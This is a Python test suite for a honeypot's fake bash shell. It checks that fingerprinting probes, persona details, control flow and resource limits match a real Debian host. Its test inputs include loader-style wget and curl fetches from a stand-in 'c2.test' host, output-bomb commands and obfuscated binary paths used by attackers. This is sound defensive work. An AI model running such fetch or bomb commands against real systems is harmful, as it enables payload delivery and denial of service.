#!/usr/bin/env python3
"""Honeypot-detection probe suite.

Different question from difftest*.py. Those ask "does this behave like bash";
this asks "would a fingerprinting script conclude this is a honeypot". The two
find different bugs: an 8-byte /bin/echo is perfectly valid bash behaviour and
still gave us away instantly.

Every probe here is something real detectors actually read. A probe FAILS if the
output is empty, says "command not found", or says "No such file" -- any of which
tells the attacker the system is a facade.

Run after any change:  python3 -W ignore probesuite.py
"""
import importlib.util
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "fakeshell", os.path.join(HERE, "fakeshell.py"))
fs = importlib.util.module_from_spec(spec)
spec.loader.exec_module(fs)

PROBES = [
    # --- /proc and /sys: read constantly by fingerprinting scripts ---
    ("proc self status",   "head -2 /proc/self/status"),
    ("proc self cmdline",  "cat /proc/self/cmdline"),
    ("proc 1 cmdline",     "cat /proc/1/cmdline"),
    ("proc 1 comm",        "cat /proc/1/comm"),
    ("proc net tcp",       "head -2 /proc/net/tcp"),
    ("proc net dev",       "head -2 /proc/net/dev"),
    ("proc mounts",        "head -2 /proc/mounts"),
    ("proc filesystems",   "head -2 /proc/filesystems"),
    ("proc modules",       "head -2 /proc/modules"),
    ("proc cpuinfo",       "grep -m1 vendor_id /proc/cpuinfo"),
    ("proc meminfo",       "grep MemTotal /proc/meminfo"),
    ("proc uptime",        "cat /proc/uptime"),
    ("proc version",       "cat /proc/version"),
    ("sys class net",      "ls /sys/class/net"),
    ("sys net address",    "cat /sys/class/net/eth0/address"),
    ("dev listing",        "ls /dev | head -4"),
    # --- is this a real binary? the check that actually caught us ---
    ("cat a binary",       "cat /bin/echo | wc -c"),
    ("binary size",        "ls -l /bin/echo"),
    ("binary elf magic",   "head -c 4 /bin/echo"),
    # --- system inventory ---
    ("mount",              "mount | head -2"),
    ("lsmod",              "lsmod | head -2"),
    ("dmesg",              "dmesg | head -2"),
    ("stat",               "stat /etc/passwd | head -2"),
    ("dpkg list",          "dpkg -l | wc -l"),
    ("df -i",              "df -i | head -2"),
    ("netstat",            "netstat -tuln | head -2"),
    ("ip link",            "ip link | head -2"),
    ("hostname -I",        "hostname -I"),
    ("systemd-detect-virt", "systemd-detect-virt"),
    ("dmidecode",          "dmidecode -s system-product-name"),
    # --- shell + toolchain identity ---
    ("bash --version",     "bash --version | head -1"),
    ("python3 --version",  "python3 --version"),
    ("perl -v",            "perl -v | head -2"),
    ("openssl version",    "openssl version"),
    ("arch",               "arch"),
    ("getconf",            "getconf LONG_BIT"),
    ("ulimit",             "ulimit -n"),
    ("uptime -p",          "uptime -p"),
    ("history",            "history | tail -2"),
    ("sudo -l",            "sudo -l | head -1"),
    ("mktemp",             "mktemp"),
    ("env",                "env | head -2"),
    # --- can the shell actually do things? ---
    ("redirect works",     "echo 1 > /dev/null && echo redirect-ok"),
    ("write+exec+remove",
     """printf '#!/bin/sh\\necho selftest\\n' > /tmp/.p && chmod +x /tmp/.p && /tmp/.p && rm -f /tmp/.p"""),
    ("missing path error",  "./definitely-not-here"),
    ("missing cmd error",   "definitely-not-a-command"),
]

# Genuinely absent on a minimal Debian cloud image -- "not found" is the
# CORRECT answer, so these must not be treated as failures.
EXPECTED_ABSENT = {"lsb_release"}


def run(cmd):
    sh = fs.Shell()
    return (sh.run(cmd) + "".join(sh._err)).strip()


def invariants():
    """Structural checks, not output probes.

    These catch a whole class of tell at once instead of one command at a time:
    a binary the filesystem claims exists but that will not run, or a bash
    builtin reporting "command not found", which is impossible on a real box.
    """
    bad = []
    sh = fs.Shell()
    listed = set()
    for path in sh.fs.nodes:
        d, _, name = path.rpartition("/")
        if d in ("/bin", "/sbin", "/usr/bin", "/usr/sbin",
                 "/usr/local/bin", "/usr/local/sbin"):
            listed.add(name)
    # The contract is not "every binary has a handler" -- a real Debian ships
    # several hundred and we implement the ones attackers use. It is that no
    # binary on the disk answers with *silent success*, which is the failure
    # mode that corrupts a capture without anyone noticing. One without a
    # handler must fail loudly: non-empty stderr and a non-zero status.
    silent = []
    for name in sorted(listed):
        # Dispatch normalises a dot the same way it normalises a dash --
        # update-rc.d and python3.13 are both real command names -- so the
        # exclusion has to normalise it too, or a command that does have a
        # handler is probed as if it had none.
        if hasattr(fs.Shell, "cmd_" + name.replace("-", "_").replace(
                ".", "_")):
            continue
        probe = fs.Shell()
        probe.exec_mode = True
        out = probe.run(name)
        err = "".join(probe._err)
        if probe.last_rc == 0 or (not out.strip() and not err.strip()):
            silent.append(name)
    print("  %s %-26s %s" % ("FAIL" if silent else "ok  ",
                             "no silent binaries",
                             ("%d succeed silently: %s"
                              % (len(silent), " ".join(silent[:8]))) if silent
                             else "%d binaries, none silent" % len(listed)))
    if silent:
        bad.append("silently successful binaries: " + " ".join(silent))

    # The persona is spread across ~20 hand-edited strings in three files, so a
    # release bump leaves stragglers. Every surface that names the OS, the
    # kernel or sshd must agree -- a box whose `uname -r` and /proc/version
    # disagree is not a box.
    sh_p = fs.Shell()
    def _out(cmd):
        return (sh_p.run(cmd) or "")
    kernel = _out("uname -r").strip()
    persona = []
    if kernel not in _out("cat /proc/version"):
        persona.append("uname -r not in /proc/version")
    if kernel not in _out("uname -a"):
        persona.append("uname -r not in uname -a")
    if kernel not in _out("sysctl kernel.osrelease"):
        persona.append("uname -r not in sysctl kernel.osrelease")
    if kernel not in _out("hostnamectl"):
        persona.append("uname -r not in hostnamectl")
    major = _out("cat /etc/debian_version").strip().split(".")[0]
    for cmd, label in (("cat /etc/os-release", "os-release"),
                       ("cat /etc/issue", "issue"),
                       ("hostnamectl", "hostnamectl")):
        if major not in _out(cmd):
            persona.append("debian_version major %r missing from %s" % (major, label))
    osr = _out("cat /etc/os-release")
    if 'VERSION_ID="%s"' % major not in osr:
        persona.append("VERSION_ID disagrees with /etc/debian_version")
    # Non-interactive bash prefixes errors with the physical line number;
    # interactive bash does not. `ssh host '<cmd>'` is the non-interactive
    # path, and the recon payload we have logged 81 times harvests both error
    # strings verbatim under a ===SHELL_BEHAVIOR=== banner -- so this is
    # diffed against the real bash on this machine rather than asserted.
    import subprocess as _sp, tempfile as _tf
    probe_script = ("echo one\n"
                    "x=$( ( ./xxxxxx 2>&1 || true ); ( xxxxxx 2>&1 || true ) )\n"
                    "echo \"$x\"\n")
    real = _sp.run(["bash", "-c", probe_script], capture_output=True, text=True,
                   cwd=_tf.mkdtemp()).stdout
    esh = fs.Shell()
    esh.exec_mode = True
    ours = esh.run(probe_script)
    def _errs(text):
        return [l for l in text.splitlines()
                if "command not found" in l or "No such file or directory" in l]
    if _errs(ours) != _errs(real):
        persona.append("exec-mode errors differ from bash: %r vs %r"
                       % (_errs(ours), _errs(real)))
    # ...and the interactive shell must NOT carry the prefix.
    ish = fs.Shell()
    ish.run("xxxxxx")
    if "line " in "".join(ish._err):
        persona.append("interactive shell leaked a line number: %r"
                       % "".join(ish._err))

    # Comments and backgrounding, diffed against the bash running this suite.
    # Both were found by the first real loader to reach the box: it opened with
    # `#!/bin/sh`, which we answered with "No such file or directory" on stderr,
    # and it wrapped its downloader in `do_dl &`, which we registered as a fake
    # pid and never ran -- so the stage-two fetch never happened and we lost
    # the payload. Neither shows up as an unknown command, so the gap counter
    # could not see them.
    shell_cases = [
        "#!/bin/sh\necho hi",
        "# just a comment\necho hi",
        "echo one   # trailing comment",
        'echo "# quoted is not a comment"',
        "x=abcdef; echo ${#x}",      # $-hash is not a comment
        "greet() { echo RAN; }\ngreet &\nwait",
        "f() { echo BG; }\nf &\nsleep 0",
    ]
    for case in shell_cases:
        r = _sp.run(["bash", "-c", case], capture_output=True, text=True,
                    cwd=_tf.mkdtemp())
        c = fs.Shell()
        c.exec_mode = True
        mine = c.run(case)
        if mine != r.stdout or "".join(c._err) != r.stderr:
            persona.append("shell differs from bash for %r: ours=%r/%r bash=%r/%r"
                           % (case[:24], mine[:40], "".join(c._err)[:40],
                              r.stdout[:40], r.stderr[:40]))
            break

    # Control flow, diffed against bash. `return` and `exit` did nothing at
    # all, so a function using `return` as an early exit ran its whole body --
    # which is why a loader's downloader attempted every one of its six fetch
    # methods after the first had already succeeded. And a loop body was
    # delimited by trimming a trailing "done" from the string, so
    # `for ...; done; echo done` took the wrong one and folded the following
    # commands into the loop.
    flow_cases = [
        "f() { echo first; [ 1 = 1 ] && return 0; echo NOPE; }\nf\necho after",
        "g() { if true; then echo A; return 0; fi; echo NOPE_B; }\ng",
        "echo one; exit 0; echo NOPE",
        "for i in 1 2 3; do echo $i; [ $i = 2 ] && break; done; echo done",
        "for i in a b; do echo $i; done; echo tail",
        "for i in 1 2 3; do [ $i = 2 ] && continue; echo $i; done",
        "n=0; while true; do n=$((n+1)); [ $n = 3 ] && break; done; echo $n; echo end",
        "for i in 1 2; do for j in x y; do echo $i$j; done; done; echo fin",
        "x=$(exit 3); echo still_here",
        "a() { echo A; return 0; }\nb() { a; echo B; }\nb",
        "f() { for i in 1 2 3; do [ $i = 2 ] && return 0; echo $i; done; echo NOPE; }\nf\necho after",
    ]
    for case in flow_cases:
        r = _sp.run(["bash", "-c", case], capture_output=True, text=True,
                    cwd=_tf.mkdtemp())
        c = fs.Shell()
        c.exec_mode = True
        mine = c.run(case)
        if mine != r.stdout:
            persona.append("control flow differs for %r: ours=%r bash=%r"
                           % (case[:34], mine[:44], r.stdout[:44]))
            break

    # Every binary must behave the same called bare or by absolute path. A
    # stock binary's bytes are synthesised on read, so node.content is empty;
    # the path-execution branch inspected it directly, decided this was not an
    # ELF, ran it as an empty script and returned rc=0 with no output. So
    # `uname -m` worked while `/bin/uname -m` printed nothing -- and the recon
    # payload we see most often uses exactly those absolute-path fallbacks. A
    # live actor calling `/bin/./uname` got silence where a real box answers.
    listed = {}
    probe0 = fs.Shell()
    for path, node in probe0.fs.nodes.items():
        d, _, nm = path.rpartition("/")
        if d in ("/bin", "/sbin", "/usr/bin", "/usr/sbin",
                 "/usr/local/bin", "/usr/local/sbin"):
            listed.setdefault(nm, path)
    path_diff = []
    # Some commands are nondeterministic by design -- mktemp and uuidgen mint a
    # new name each call, and anything reporting byte counters moves with the
    # clock. Compare structure, with digit runs and random-looking names
    # masked, so this catches "the two spellings behave differently" without
    # flagging "the two calls returned different numbers".
    import re as _re

    def _shape(text):
        # Randomly-generated names first, as a whole. mktemp's
        # /tmp/tmp.<10 random chars> was being split by the hex rule below
        # whenever the random part happened to contain four hex characters
        # in a row, leaving fragments too short for the 8-character rule --
        # so two calls shaped differently and the invariant failed about one
        # run in five.
        text = _re.sub(r"(/tmp/(?:tmp|tmpfile)\.)[A-Za-z0-9]{6,}", r"\1X", text)
        # A gzip header carries a 4-byte mtime, so two invocations a second
        # apart differ in bytes 5-8 and shape differently. Real gzip does
        # the same; masking the header is the honest fix, not pinning the
        # clock. Same class as the mktemp name below.
        text = _re.sub(r"\x1f\x8b\x08.{7}", "\x1f\x8b\x08<HDR>", text,
                       flags=_re.S)
        # Hex runs next: a UUID's letters survive digit-masking, so uuidgen
        # looked structurally different from one call to the next.
        text = _re.sub(r"[0-9a-fA-F]{4,}", "X", text)
        text = _re.sub(r"\d+", "N", text)
        return _re.sub(r"[A-Za-z0-9]{8,}", "X", text)

    for nm, full in sorted(listed.items()):
        a = fs.Shell(); a.exec_mode = True
        oa, ea = a.run(nm), "".join(a._err)
        b = fs.Shell(); b.exec_mode = True
        ob, eb = b.run(full), "".join(b._err)
        if (_shape(oa), _shape(ea)) != (_shape(ob), _shape(eb)):
            path_diff.append(nm)
    if path_diff:
        persona.append("differ by absolute path: %s" % " ".join(path_diff[:8]))
    # and the obfuscated spellings a real actor used
    for spelling in ("/bin/./uname -m", "/bin//uname -m",
                     "/usr/bin/../bin/uname -m"):
        c = fs.Shell(); c.exec_mode = True
        if c.run(spelling).strip() != "x86_64":
            persona.append("path obfuscation broke %r" % spelling)
            break

    # The fetch must go to the URL, not to a flag's value. `wget -T 30 URL`
    # sent the download to "30" because any non-flag word counted as a URL --
    # the real loader only got its payload because it fell back to curl, and a
    # wget-only loader would have fetched nothing at all.
    fetch_cases = [
        ("wget --no-check-certificate -q -T 30 http://c2.test/a -O out", "http://c2.test/a"),
        ("wget -q -t 3 -T 15 -U Mozilla http://c2.test/b -O x", "http://c2.test/b"),
        ("wget -qO- http://c2.test/c", "http://c2.test/c"),
        ("curl -skL -m 30 http://c2.test/d -o out", "http://c2.test/d"),
        ("curl -H 'X: 1' --connect-timeout 5 -A curl/8 http://c2.test/e", "http://c2.test/e"),
        ("curl --max-time 20 -x http://proxy.test:8080 http://c2.test/f -o g", "http://c2.test/f"),
    ]
    for cmd, want in fetch_cases:
        got = []
        probe = fs.Shell(download=lambda u: (got.append(u) or
                                             {"sha256": "0" * 64, "size": 4,
                                              "body": b"pay"}))
        probe.exec_mode = True
        probe.run(cmd)
        if got != [want]:
            persona.append("fetch went to %r not %r for %r" % (got, want, cmd[:40]))
            break

    # Every command the fake .bash_history claims root ran must actually run.
    # Found by hand: the history said `vim /etc/nginx/...` while vim answered
    # "command not found", which is a plainer contradiction than any missing
    # binary -- the box is asserting someone used a tool it does not have.
    hist = _out("cat /root/.bash_history")
    for line in hist.splitlines():
        for seg in line.replace("|", ";").split(";"):
            words = seg.split()
            if not words:
                continue
            name = words[0]
            if name in ("exit", "cd"):
                continue
            probe = fs.Shell()
            probe.run(name + " --version")
            if probe.last_rc == 127:
                persona.append("history runs %r but it is not found" % name)

    # The SSH persona and the web persona must agree on the database, since the
    # SQL oracle and the leaked .env both name it.
    myver = _out("mysql --version")
    if "MariaDB" in myver:
        import re as _re
        m = _re.search(r"(\d+\.\d+)\.\d+-MariaDB", myver)
        unit = _out("systemctl")
        if m and ("MariaDB " + m.group(1)) not in unit:
            persona.append("mysql --version and the mariadb unit disagree")

    # Anything sources.list points at has to exist.
    for line in _out("cat /etc/apt/sources.list").splitlines():
        for tok in line.replace("#", " ").split():
            if tok.startswith("/etc/apt/") and not sh_p.fs.exists(tok):
                persona.append("sources.list points at missing %s" % tok)
    print("  %s %-26s %s" % ("FAIL" if persona else "ok  ", "persona is self-consistent",
                             "; ".join(persona) if persona
                             else "kernel %s, Debian %s agree everywhere" % (kernel, major)))
    if persona:
        bad.append("persona: " + "; ".join(persona))

    BUILTINS = ["exec", "source", ".", "let", "declare", "typeset", "readonly",
                "local", "trap", "hash", "umask", "alias", "unalias", "jobs",
                "disown", "bg", "fg", "times", "getopts", "caller", "suspend",
                "shopt", "builtin", "enable", "compgen", "eval", "command",
                "type", "set", "unset", "shift", "cd", "pwd", "export"]
    missing = []
    for b in BUILTINS:
        sh2 = fs.Shell()
        sh2.run(b + (" /dev/null" if b in (".", "source") else ""))
        if sh2.last_rc == 127:
            missing.append(b)
    print("  %s %-26s %s" % ("FAIL" if missing else "ok  ", "all bash builtins exist",
                             " ".join(missing) if missing
                             else "%d builtins resolve" % len(BUILTINS)))
    if missing:
        bad.append("missing builtins: " + " ".join(missing))

    # sleep must really sleep -- an instant return is timeable -- but must stay
    # bounded, or a visitor can pin every thread we have.
    import time as _t
    sh3 = fs.Shell()
    t0 = _t.time(); sh3.run("sleep 1"); short = _t.time() - t0
    t1 = _t.time(); sh3.run("sleep 3600"); long_ = _t.time() - t1
    ok_sleep = 0.9 <= short <= 1.6 and long_ <= fs.SLEEP_CALL_CAP + 1
    print("  %s %-26s sleep 1 -> %.2fs, sleep 3600 -> %.2fs (cap %.0fs)"
          % ("ok  " if ok_sleep else "FAIL", "sleep is real but capped",
             short, long_, fs.SLEEP_CALL_CAP))
    if not ok_sleep:
        bad.append("sleep timing wrong")

    # A session cannot be made to sleep forever by repeating the call.
    sh4 = fs.Shell()
    budget = fs.SLEEP_SESSION_BUDGET
    sh4._sleep_left = 2.0
    t2 = _t.time()
    for _ in range(5):
        sh4.run("sleep 60")
    spent = _t.time() - t2
    ok_budget = spent <= 4.0
    print("  %s %-26s 5x 'sleep 60' on a 2s budget took %.2fs"
          % ("ok  " if ok_budget else "FAIL", "session sleep budget", spent))
    if not ok_budget:
        bad.append("sleep budget not enforced")

    # An attacker who stages a payload must be able to see it. Both halves of
    # this were broken in production: `ls -ld` on a directory printed only a
    # "total" line, and a freshly created directory carried the filesystem's
    # synthetic build date instead of now.
    import time as _t2
    sh6 = fs.Shell()
    sh6.run("mkdir -p /tmp/.stage42")
    ld = sh6.run("ls -ld /tmp/.stage42")
    ok_ld = ld.startswith("drwx") and "/tmp/.stage42" in ld and "total" not in ld
    print("  %s %-26s %r" % ("ok  " if ok_ld else "FAIL",
                             "ls -ld describes the dir", ld.strip()[:58]))
    if not ok_ld:
        bad.append("ls -ld does not describe the directory")
    stamp = _t2.strftime("%b", _t2.localtime())
    ok_mt = stamp in ld
    print("  %s %-26s expected month %s" % ("ok  " if ok_mt else "FAIL",
                                            "new dir mtime is now", stamp))
    if not ok_mt:
        bad.append("freshly created directory has a stale mtime")

    # A staged file must be visible and intact to ls/wc/cat, or the attacker
    # concludes the upload failed -- which is exactly what cost us a sample.
    sh7 = fs.Shell()
    sh7.run("mkdir -p /root/.drop")
    sh7.fs.write("/root/.drop/payload.bin", b"ELFPAYLOAD" * 10)
    listing = sh7.run("ls -la /root/.drop/")
    size = sh7.run("wc -c /root/.drop/payload.bin").split()[0] if listing else "?"
    ok_vis = "payload.bin" in listing and size == "100"
    print("  %s %-26s ls shows it, wc -c = %s" % ("ok  " if ok_vis else "FAIL",
                                                  "staged file is visible", size))
    if not ok_vis:
        bad.append("staged file not visible with correct size")

    # No single command may OOM the service. `seq 1 5000000` produced 38MB and
    # peaked over 3GB RSS against a MemoryMax of 256M -- one command line was a
    # remote kill.
    import signal as _sig
    bombs = [("seq 1 100000000", "seq"), ("printf '%09999999d' 1", "printf width"),
             ("yes", "yes"), ("for i in $(seq 1 90000000); do :; done", "for over seq")]
    worst = 0
    hung = []
    for cmd, label in bombs:
        sh8 = fs.Shell()
        def _bail(*a):
            raise TimeoutError()
        _sig.signal(_sig.SIGALRM, _bail)
        _sig.alarm(8)
        try:
            out = sh8.run(cmd)
            worst = max(worst, len(out))
        except TimeoutError:
            hung.append(label)
        finally:
            _sig.alarm(0)
    ok_bomb = not hung and worst <= fs.MAX_OUTPUT
    print("  %s %-26s largest output %d, cap %d%s"
          % ("ok  " if ok_bomb else "FAIL", "output bombs are bounded", worst,
             fs.MAX_OUTPUT, (" HUNG: " + ",".join(hung)) if hung else ""))
    if not ok_bomb:
        bad.append("an output bomb exceeded the cap or hung: %s" % (hung or worst))

    # tar has to survive a real round trip, or an attacker unpacking their
    # own tooling watches it silently vanish.
    sh5 = fs.Shell()
    sh5.run("mkdir -p /tmp/rt && echo payload > /tmp/rt/f")
    sh5.run("cd /tmp && tar -czf /tmp/rt.tgz rt")
    sh5.run("rm -rf /tmp/rt")
    sh5.run("cd /tmp && tar -xzf /tmp/rt.tgz")
    got = sh5.run("cat /tmp/rt/f").strip()
    print("  %s %-26s %r" % ("ok  " if got == "payload" else "FAIL",
                             "tar round trip", got))
    if got != "payload":
        bad.append("tar round trip broken")
    return bad


def main():
    failures = []
    print("=== structural invariants ===")
    struct = invariants()
    print("\n=== output probes ===")
    for name, cmd in PROBES:
        out = run(cmd)
        # The two error probes are SUPPOSED to produce an error message.
        expect_err = name.startswith("missing ")
        bad = (out == "")
        if not expect_err:
            bad = bad or "command not found" in out or "No such file" in out
        if bad:
            failures.append((name, cmd, out))
        print("  %s %-20s %s" % ("FAIL" if bad else "ok  ", name,
                                 out.replace("\n", " | ")[:84]))
    print("\n  %d/%d probes pass" % (len(PROBES) - len(failures), len(PROBES)))
    for name, cmd, out in failures:
        print("    FAIL %-20s $ %-40s -> %r" % (name, cmd, out[:60]))
    for s in struct:
        print("    FAIL invariant: %s" % s)
    return 1 if (failures or struct) else 0


if __name__ == "__main__":
    sys.exit(main())
